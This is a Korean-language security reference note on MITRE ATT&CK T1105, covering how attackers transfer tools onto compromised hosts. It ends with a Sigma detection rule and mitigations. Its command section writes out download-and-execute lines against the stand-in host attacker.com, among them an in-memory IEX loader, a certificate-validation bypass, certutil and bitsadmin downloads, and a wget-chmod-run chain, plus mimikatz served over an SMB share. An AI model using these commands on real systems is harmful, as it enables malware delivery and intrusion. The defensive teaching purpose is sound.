# T1105 — Ingress Tool Transfer

## 개요

**TA0011 / T1105**  
외부 인터넷에서 피해 시스템으로 공격 도구나 페이로드를 전달하는 기법입니다. 공격자는 Windows 내장 도구(LOLBin)를 활용하거나 일반적인 다운로드 유틸리티를 사용하여 추가 도구를 가져옵니다.

---

## 동작 방식

1. 초기 접근 후 제한된 환경에서 추가 도구 필요
2. 시스템 내장 유틸리티(certutil, bitsadmin 등)로 외부에서 파일 다운로드
3. 다운로드된 도구로 권한 상승, 자격증명 탈취, 횡이동 수행
4. AV/EDR 탐지 회피를 위해 메모리에 직접 로드하는 파일리스 기법도 활용

**주요 LOLBin (Living Off the Land Binary):**
- `certutil.exe` — 인증서 도구, URL 다운로드 가능
- `bitsadmin.exe` — BITS 서비스를 통한 다운로드
- `powershell.exe` — WebClient/IWR
- `mshta.exe`, `regsvr32.exe` — 원격 스크립트 실행

---

## 주요 커맨드 / 실습

### PowerShell 다운로드
```powershell
# Invoke-WebRequest (IWR)
Invoke-WebRequest -Uri "http://attacker.com/tool.exe" -OutFile "C:\temp\tool.exe"

# WebClient (탐지 우회 변형)
(New-Object System.Net.WebClient).DownloadFile("http://attacker.com/tool.exe", "C:\temp\tool.exe")

# 메모리에 직접 로드 (파일리스)
IEX (New-Object System.Net.WebClient).DownloadString("http://attacker.com/payload.ps1")

# HTTPS 인증서 검증 우회
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(New-Object System.Net.WebClient).DownloadFile("https://attacker.com/tool.exe", "C:\temp\tool.exe")
```

### certutil.exe (LOLBin)
```cmd
# URL 캐시를 이용한 파일 다운로드
certutil.exe -urlcache -split -f "http://attacker.com/tool.exe" C:\temp\tool.exe

# Base64 디코딩과 결합
certutil.exe -urlcache -split -f "http://attacker.com/payload.b64" payload.b64
certutil.exe -decode payload.b64 payload.exe
```

### bitsadmin.exe (LOLBin)
```cmd
# BITS 서비스를 통한 파일 다운로드
bitsadmin /transfer malJob /download /priority normal "http://attacker.com/tool.exe" C:\temp\tool.exe

# 조용한 다운로드 (백그라운드)
bitsadmin /create malJob
bitsadmin /addfile malJob "http://attacker.com/tool.exe" "C:\temp\tool.exe"
bitsadmin /resume malJob
bitsadmin /complete malJob
```

### curl / wget
```bash
# curl (Windows 10 1803+ 내장)
curl -o C:\temp\tool.exe http://attacker.com/tool.exe
curl -L -o tool.exe https://attacker.com/tool.exe

# wget (Linux)
wget http://attacker.com/tool -O /tmp/tool
wget -q http://attacker.com/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
```

### Impacket SMB Server (파일 서빙)
```bash
# 공격자 시스템에서 SMB 서버 실행
python3 smbserver.py SHARE /path/to/tools/

# 피해 시스템에서 다운로드
copy \\192.168.1.100\SHARE\mimikatz.exe C:\temp\
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Suspicious File Download via LOLBin
id: c3e7a5b1-8f4d-4e2b-a9c6-3d1b8e5a7c4f
status: stable
description: Detects file download attempts via certutil or bitsadmin with HTTP/HTTPS URLs
logsource:
    product: windows
    category: process_creation
detection:
    selection_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - 'urlcache'
            - 'verifyctl'
    selection_bitsadmin:
        Image|endswith: '\bitsadmin.exe'
        CommandLine|contains: 'http'
    condition: 1 of selection_*
falsepositives:
    - Legitimate certificate operations by certutil
    - Windows Update using BITS
level: high
tags:
    - attack.command_and_control
    - attack.t1105
```

---

## 대응 방안

1. 아웃바운드 HTTP/HTTPS를 프록시를 통해 강제 경유 (직접 인터넷 접근 차단)
2. 프록시에서 알려진 악성 IP/도메인 차단
3. PowerShell 실행 정책 및 스크립트 블록 로깅 활성화
4. certutil, bitsadmin의 URL 다운로드 기능 AppLocker로 차단
5. LOLBAS 기반 탐지 규칙 SIEM 적용
6. Application Control (Windows Defender Application Control) 적용

---

## 참고자료
- [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Impacket GitHub](https://github.com/fortra/impacket)
